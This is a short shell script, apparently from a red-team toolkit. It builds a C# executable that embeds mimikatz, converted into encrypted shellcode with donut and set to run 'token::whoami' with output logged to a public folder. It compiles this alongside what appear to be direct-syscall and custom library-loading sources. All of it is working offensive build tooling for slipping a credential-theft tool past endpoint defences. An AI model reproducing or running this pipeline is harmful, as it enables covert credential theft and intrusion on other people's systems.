cp Program.cs test.cs
echo 'public static class Global {' >> test.cs
echo -n 'public static ' >> test.cs
donut -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"' ../mimikatz/x64/mimikatz.exe  -f 7 -o mimi.cs
cat mimi.cs >> test.cs
echo '}' >> test.cs
mcs -optimize- -unsafe -platform:x64 -out:test.exe test.cs NativeSysCall.cs Natives.cs CustomLoadLibrary.cs